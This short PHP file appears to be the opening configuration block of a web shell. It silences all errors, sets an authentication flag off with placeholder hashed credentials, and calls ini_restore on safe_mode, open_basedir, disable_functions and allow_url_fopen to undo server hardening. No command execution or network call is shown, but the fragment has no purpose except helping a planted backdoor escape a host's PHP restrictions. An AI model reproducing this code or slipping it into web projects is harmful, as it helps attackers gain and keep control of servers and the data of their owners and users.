<?php 
error_reporting(0);

$language='eng';

$auth = 0;

$name='abcdef1234567890abcdef1234567890'; 
$pass='abcdef1234567890abcdef1234567890';

@ini_restore("safe_mode");
@ini_restore("open_basedir");
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");
?>